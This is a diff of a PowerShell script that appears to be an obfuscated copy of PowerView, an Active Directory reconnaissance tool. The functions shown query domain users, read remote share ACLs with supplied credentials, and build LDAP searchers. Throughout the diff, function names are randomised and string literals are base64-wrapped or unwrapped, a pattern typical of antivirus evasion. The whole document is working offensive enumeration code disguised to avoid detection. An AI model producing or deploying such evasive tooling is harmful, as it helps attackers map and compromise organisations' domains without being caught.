-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+        if ($PSBoundParameters['Domain']) { $UserSearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['LDAPFilter']) { $UserSearcherArguments['LDAPFilter'] = $LDAPFilter }
+        if ($PSBoundParameters['SearchBase']) { $UserSearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $UserSearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $UserSearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $UserSearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $UserSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $UserSearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $UserSearcherArguments['Credential'] = $Credential }
 
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
-            $LogonToken = jgnbzn -Credential $Credential
+        if ($PSBoundParameters['Credential']) {
+            $LogonToken = kckfvi -Credential $Credential
         }
     }
 
     PROCESS {
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $Identity }
-        cqaorm @UserSearcherArguments | Where-Object {$_.samaccountname -ne ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("a3JidGd0")))} | tinlez -OutputFormat $OutputFormat
+        if ($PSBoundParameters['Identity']) { $UserSearcherArguments['Identity'] = $Identity }
+        ykrker @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | vtlabq -OutputFormat $OutputFormat
     }
 
     END {
         if ($LogonToken) {
-            husafk -TokenHandle $LogonToken
+            njmybn -TokenHandle $LogonToken
         }
     }
 }
 
 
-function fwxbyu {
+function gnbdtr {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -1751,7 +1755,7 @@ function fwxbyu {
 
     BEGIN {
 
-        function zybeig {
+        function bluxqj {
             
             [CmdletBinding()]
             Param(
@@ -1760,35 +1764,35 @@ function fwxbyu {
             )
 
             $AccessMask = @{
-                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHg4MDAwMDAwMA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2VuZXJpY1JlYWQ=")))
-                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHg0MDAwMDAwMA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2VuZXJpY1dyaXRl")))
-                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgyMDAwMDAwMA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2VuZXJpY0V4ZWN1dGU=")))
-                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgxMDAwMDAwMA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2VuZXJpY0FsbA==")))
-                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMjAwMDAwMA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWF4aW11bUFsbG93ZWQ=")))
-                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMTAwMDAwMA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWNjZXNzU3lzdGVtU2VjdXJpdHk=")))
-                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDEwMDAwMA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3luY2hyb25pemU=")))
-                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDA4MDAwMA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V3JpdGVPd25lcg==")))
-                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDA0MDAwMA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V3JpdGVEQUM=")))
-                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAyMDAwMA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVhZENvbnRyb2w=")))
-                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAxMDAwMA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVsZXRl")))
-                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAwMDEwMA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V3JpdGVBdHRyaWJ1dGVz")))
-                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAwMDA4MA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVhZEF0dHJpYnV0ZXM=")))
-                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAwMDA0MA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVsZXRlQ2hpbGQ=")))
-                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAwMDAyMA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXhlY3V0ZS9UcmF2ZXJzZQ==")))
-                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAwMDAxMA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V3JpdGVFeHRlbmRlZEF0dHJpYnV0ZXM=")))
-                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAwMDAwOA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVhZEV4dGVuZGVkQXR0cmlidXRlcw==")))
-                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAwMDAwNA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QXBwZW5kRGF0YS9BZGRTdWJkaXJlY3Rvcnk=")))
-                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAwMDAwMg=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V3JpdGVEYXRhL0FkZEZpbGU=")))
-                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAwMDAwMQ=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVhZERhdGEvTGlzdERpcmVjdG9yeQ==")))
+                [uint32]'0x80000000' = 'GenericRead'
+                [uint32]'0x40000000' = 'GenericWrite'
+                [uint32]'0x20000000' = 'GenericExecute'
+                [uint32]'0x10000000' = 'GenericAll'
+                [uint32]'0x02000000' = 'MaximumAllowed'
+                [uint32]'0x01000000' = 'AccessSystemSecurity'
+                [uint32]'0x00100000' = 'Synchronize'
+                [uint32]'0x00080000' = 'WriteOwner'
+                [uint32]'0x00040000' = 'WriteDAC'
+                [uint32]'0x00020000' = 'ReadControl'
+                [uint32]'0x00010000' = 'Delete'
+                [uint32]'0x00000100' = 'WriteAttributes'
+                [uint32]'0x00000080' = 'ReadAttributes'
+                [uint32]'0x00000040' = 'DeleteChild'
+                [uint32]'0x00000020' = 'Execute/Traverse'
+                [uint32]'0x00000010' = 'WriteExtendedAttributes'
+                [uint32]'0x00000008' = 'ReadExtendedAttributes'
+                [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
+                [uint32]'0x00000002' = 'WriteData/AddFile'
+                [uint32]'0x00000001' = 'ReadData/ListDirectory'
             }
 
             $SimplePermissions = @{
-                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgxZjAxZmY="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RnVsbENvbnRyb2w=")))
-                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMzAxYmY="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TW9kaWZ5")))
-                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMjAwYTk="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVhZEFuZEV4ZWN1dGU=")))
-                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMjAxOWY="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVhZEFuZFdyaXRl")))
-                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMjAwODk="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVhZA==")))
-                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAxMTY="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V3JpdGU=")))
+                [uint32]'0x1f01ff' = 'FullControl'
+                [uint32]'0x0301bf' = 'Modify'
+                [uint32]'0x0200a9' = 'ReadAndExecute'
+                [uint32]'0x02019f' = 'ReadAndWrite'
+                [uint32]'0x020089' = 'Read'
+                [uint32]'0x000116' = 'Write'
             }
 
             $Permissions = @()
@@ -1803,11 +1807,11 @@ function fwxbyu {
 
             
             $Permissions += $AccessMask.Keys | Where-Object { $FSR -band $_ } | ForEach-Object { $AccessMask[$_] }
-            ($Permissions | Where-Object {$_}) -join ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA==")))
+            ($Permissions | Where-Object {$_}) -join ','
         }
 
         $ConvertArguments = @{}
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ConvertArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+        if ($PSBoundParameters['Credential']) { $ConvertArguments['Credential'] = $Credential }
 
         $MappedComputers = @{}
     }
@@ -1815,11 +1819,11 @@ function fwxbyu {
     PROCESS {
         ForEach ($TargetPath in $Path) {
             try {
-                if (($TargetPath -Match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFxcXC4qXFwuKg==")))) -and ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))])) {
+                if (($TargetPath -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                     $HostComputer = (New-Object System.Uri($TargetPath)).Host
                     if (-not $MappedComputers[$HostComputer]) {
                         
-                        jymmbe -ComputerName $HostComputer -Credential $Credential
+                        ehlhmp -ComputerName $HostComputer -Credential $Credential
                         $MappedComputers[$HostComputer] = $True
                     }
                 }
@@ -1828,32 +1832,32 @@ function fwxbyu {
 
                 $ACL.GetAccessRules($True, $True, [System.Security.Principal.SecurityIdentifier]) | ForEach-Object {
                     $SID = $_.IdentityReference.Value
-                    $Name = ylepkl -ObjectSID $SID @ConvertArguments
+                    $Name = rnmqfb -ObjectSID $SID @ConvertArguments
 
                     $Out = New-Object PSObject
-                    $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UGF0aA=="))) $TargetPath
-                    $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmlsZVN5c3RlbVJpZ2h0cw=="))) (zybeig -FSR $_.FileSystemRights.value__)
-                    $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHlSZWZlcmVuY2U="))) $Name
-                    $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHlTSUQ="))) $SID
-                    $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWNjZXNzQ29udHJvbFR5cGU="))) $_.AccessControlType
-                    $Out.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkZpbGVBQ0w="))))
+                    $Out | Add-Member Noteproperty 'Path' $TargetPath
+                    $Out | Add-Member Noteproperty 'FileSystemRights' (bluxqj -FSR $_.FileSystemRights.value__)
+                    $Out | Add-Member Noteproperty 'IdentityReference' $Name
+                    $Out | Add-Member Noteproperty 'IdentitySID' $SID
+                    $Out | Add-Member Noteproperty 'AccessControlType' $_.AccessControlType
+                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.FileACL')
                     $Out
                 }
             }
             catch {
-                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1QYXRoQWNsXSBlcnJvcjogezB9"))) -f $_)
+                Write-Verbose ("[Get-PathAcl] error: {0}" -f $_)
             }
         }
     }
 
     END {
         
-        $MappedComputers.Keys | erbqbk
+        $MappedComputers.Keys | oqraoh
     }
 }
 
 
-function hfjsvm {
+function tsuvgg {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -1868,56 +1872,56 @@ function hfjsvm {
     $ObjectProperties = @{}
 
     $Properties.PropertyNames | ForEach-Object {
-        if ($_ -ne ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YWRzcGF0aA==")))) {
-            if (($_ -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("b2JqZWN0c2lk")))) -or ($_ -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2lkaGlzdG9yeQ=="))))) {
+        if ($_ -ne 'adspath') {
+            if (($_ -eq 'objectsid') -or ($_ -eq 'sidhistory')) {
                 
                 $ObjectProperties[$_] = $Properties[$_] | ForEach-Object { (New-Object System.Security.Principal.SecurityIdentifier($_, 0)).Value }
             }
-            elseif ($_ -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Z3JvdXB0eXBl")))) {
+            elseif ($_ -eq 'grouptype') {
                 $ObjectProperties[$_] = $Properties[$_][0] -as $GroupTypeEnum
             }
-            elseif ($_ -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2FtYWNjb3VudHR5cGU=")))) {
+            elseif ($_ -eq 'samaccounttype') {
                 $ObjectProperties[$_] = $Properties[$_][0] -as $SamAccountTypeEnum
             }
-            elseif ($_ -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("b2JqZWN0Z3VpZA==")))) {
+            elseif ($_ -eq 'objectguid') {
                 
                 $ObjectProperties[$_] = (New-Object Guid (,$Properties[$_][0])).Guid
             }
-            elseif ($_ -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("dXNlcmFjY291bnRjb250cm9s")))) {
+            elseif ($_ -eq 'useraccountcontrol') {
                 $ObjectProperties[$_] = $Properties[$_][0] -as $UACEnum
             }
-            elseif ($_ -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bnRzZWN1cml0eWRlc2NyaXB0b3I=")))) {
+            elseif ($_ -eq 'ntsecuritydescriptor') {
                 
                 $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Properties[$_][0], 0
                 if ($Descriptor.Owner) {
-                    $ObjectProperties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3duZXI=")))] = $Descriptor.Owner
+                    $ObjectProperties['Owner'] = $Descriptor.Owner
                 }
                 if ($Descriptor.Group) {
-                    $ObjectProperties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXA=")))] = $Descriptor.Group
+                    $ObjectProperties['Group'] = $Descriptor.Group
                 }
                 if ($Descriptor.DiscretionaryAcl) {
-                    $ObjectProperties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGlzY3JldGlvbmFyeUFjbA==")))] = $Descriptor.DiscretionaryAcl
+                    $ObjectProperties['DiscretionaryAcl'] = $Descriptor.DiscretionaryAcl
                 }
                 if ($Descriptor.SystemAcl) {
-                    $ObjectProperties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtQWNs")))] = $Descriptor.SystemAcl
+                    $ObjectProperties['SystemAcl'] = $Descriptor.SystemAcl
                 }
             }
-            elseif ($_ -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YWNjb3VudGV4cGlyZXM=")))) {
+            elseif ($_ -eq 'accountexpires') {
                 if ($Properties[$_][0] -gt [DateTime]::MaxValue.Ticks) {
-                    $ObjectProperties[$_] = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TkVWRVI=")))
+                    $ObjectProperties[$_] = "NEVER"
                 }
                 else {
                     $ObjectProperties[$_] = [datetime]::fromfiletime($Properties[$_][0])
                 }
             }
-            elseif ( ($_ -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bGFzdGxvZ29u")))) -or ($_ -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bGFzdGxvZ29udGltZXN0YW1w")))) -or ($_ -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("cHdkbGFzdHNldA==")))) -or ($_ -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bGFzdGxvZ29mZg==")))) -or ($_ -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YmFkUGFzc3dvcmRUaW1l")))) ) {
+            elseif ( ($_ -eq 'lastlogon') -or ($_ -eq 'lastlogontimestamp') -or ($_ -eq 'pwdlastset') -or ($_ -eq 'lastlogoff') -or ($_ -eq 'badPasswordTime') ) {
                 
                 if ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                     
                     $Temp = $Properties[$_][0]
-                    [Int32]$High = $Temp.GetType().InvokeMember(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SGlnaFBhcnQ="))), [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
-                    [Int32]$Low  = $Temp.GetType().InvokeMember(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TG93UGFydA=="))),  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
-                    $ObjectProperties[$_] = ([datetime]::FromFileTime([Int64](([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHh7MDp4OH17MTp4OH0="))) -f $High, $Low)))
+                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
+                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
+                    $ObjectProperties[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
                 }
                 else {
                     
@@ -1929,12 +1933,12 @@ function hfjsvm {
                 $Prop = $Properties[$_]
                 try {
                     $Temp = $Prop[$_][0]
-                    [Int32]$High = $Temp.GetType().InvokeMember(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SGlnaFBhcnQ="))), [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
-                    [Int32]$Low  = $Temp.GetType().InvokeMember(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TG93UGFydA=="))),  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
-                    $ObjectProperties[$_] = [Int64](([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHh7MDp4OH17MTp4OH0="))) -f $High, $Low)
+                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
+                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
+                    $ObjectProperties[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
                 }
                 catch {
-                    Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0NvbnZlcnQtTERBUFByb3BlcnR5XSBlcnJvcjogezB9"))) -f $_)
+                    Write-Verbose ("[Convert-LDAPProperty] error: {0}" -f $_)
                     $ObjectProperties[$_] = $Prop[$_]
                 }
             }
@@ -1950,7 +1954,7 @@ function hfjsvm {
         New-Object -TypeName PSObject -Property $ObjectProperties
     }
     catch {
-        Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0NvbnZlcnQtTERBUFByb3BlcnR5XSBFcnJvciBwYXJzaW5nIExEQVAgcHJvcGVydGllcyA6IHswfQ=="))) -f $_)
+        Write-Warning ("[Convert-LDAPProperty] Error parsing LDAP properties : {0}" -f $_)
     }
 }
 
@@ -1961,7 +1965,7 @@ function hfjsvm {
 
 
 
-function ltdynu {
+function vydvzz {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -1998,7 +2002,7 @@ function ltdynu {
 
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),
+        $SearchScope = 'Subtree',
 
         [ValidateRange(1, 10000)]
         [Int]
@@ -2021,20 +2025,20 @@ function ltdynu {
     )
 
     PROCESS {
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) {
+        if ($PSBoundParameters['Domain']) {
             $TargetDomain = $Domain
 
             if ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
                 
                 $UserDomain = $ENV:USERDNSDOMAIN
                 if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $UserDomain) {
-                    $BindServer = (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ezB9LiRVc2VyRG9tYWlu"))) -f $($ENV:LOGONSERVER -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFw="))),''))
+                    $BindServer = ("{0}.$UserDomain" -f $($ENV:LOGONSERVER -replace '\\',''))
                 }
             }
         }
-        elseif ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
+        elseif ($PSBoundParameters['Credential']) {
             
-            $DomainObject = wjdyuo -Credential $Credential
+            $DomainObject = owdzhi -Credential $Credential
             $BindServer = ($DomainObject.PdcRoleOwner).Name
             $TargetDomain = $DomainObject.Name
         }
@@ -2042,44 +2046,44 @@ function ltdynu {
             
             $TargetDomain = $ENV:USERDNSDOMAIN
             if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $TargetDomain) {
-                $BindServer = (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ezB9LiRUYXJnZXREb21haW4="))) -f $($ENV:LOGONSERVER -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFw="))),''))
+                $BindServer = ("{0}.$TargetDomain" -f $($ENV:LOGONSERVER -replace '\\',''))
             }
         }
         else {
             
-            write-verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Z2V0LWRvbWFpbg==")))
-            $DomainObject = wjdyuo
+            write-verbose "get-domain"
+            $DomainObject = owdzhi
             $BindServer = ($DomainObject.PdcRoleOwner).Name
             $TargetDomain = $DomainObject.Name
         }
 
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) {
+        if ($PSBoundParameters['Server']) {
             
             $BindServer = $Server
         }
 
-        $SearchString = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUDovLw==")))
+        $SearchString = 'LDAP://'
 
         if ($BindServer -and ($BindServer.Trim() -ne '')) {
             $SearchString += $BindServer
             if ($TargetDomain) {
-                $SearchString += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lw==")))
+                $SearchString += '/'
             }
         }
 
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZVByZWZpeA==")))]) {
-            $SearchString += $SearchBasePrefix + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA==")))
+        if ($PSBoundParameters['SearchBasePrefix']) {
+            $SearchString += $SearchBasePrefix + ','
         }
 
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) {
-            if ($SearchBase -Match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XkdDOi8v")))) {
+        if ($PSBoundParameters['SearchBase']) {
+            if ($SearchBase -Match '^GC://') {
                 
-                $DN = $SearchBase.ToUpper().Trim(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lw=="))))
+                $DN = $SearchBase.ToUpper().Trim('/')
                 $SearchString = ''
             }
             else {
-                if ($SearchBase -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XkxEQVA6Ly8=")))) {
-                    if ($SearchBase -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUDovLy4rLy4r")))) {
+                if ($SearchBase -match '^LDAP://') {
+                    if ($SearchBase -match "LDAP://.+/.+") {
                         $SearchString = ''
                         $DN = $SearchBase
                     }
@@ -2095,15 +2099,15 @@ function ltdynu {
         else {
             
             if ($TargetDomain -and ($TargetDomain.Trim() -ne '')) {
-                $DN = (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9ezB9"))) -f $($TargetDomain.Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LERDPQ=="))))))
+                $DN = ("DC={0}" -f $($TargetDomain.Replace('.', ',DC=')))
             }
         }
 
         $SearchString += $DN
-        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5TZWFyY2hlcl0gc2VhcmNoIGJhc2U6ICRTZWFyY2hTdHJpbmc=")))
+        Write-Verbose "[Get-DomainSearcher] search base: $SearchString"
 
         if ($Credential -ne [Management.Automation.PSCredential]::Empty) {
-            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5TZWFyY2hlcl0gVXNpbmcgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzIGZvciBMREFQIGNvbm5lY3Rpb24=")))
+            Write-Verbose "[Get-DomainSearcher] Using alternate credentials for LDAP connection"
             
             $DomainObject = New-Object DirectoryServices.DirectoryEntry($SearchString, $Credential.UserName, $Credential.GetNetworkCredential().Password)
             $Searcher = New-Object System.DirectoryServices.DirectorySearcher($DomainObject)
@@ -2118,31 +2122,31 @@ function ltdynu {
         $Searcher.CacheResults = $False
         $Searcher.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All
 
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) {
+        if ($PSBoundParameters['ServerTimeLimit']) {
             $Searcher.ServerTimeLimit = $ServerTimeLimit
         }
 
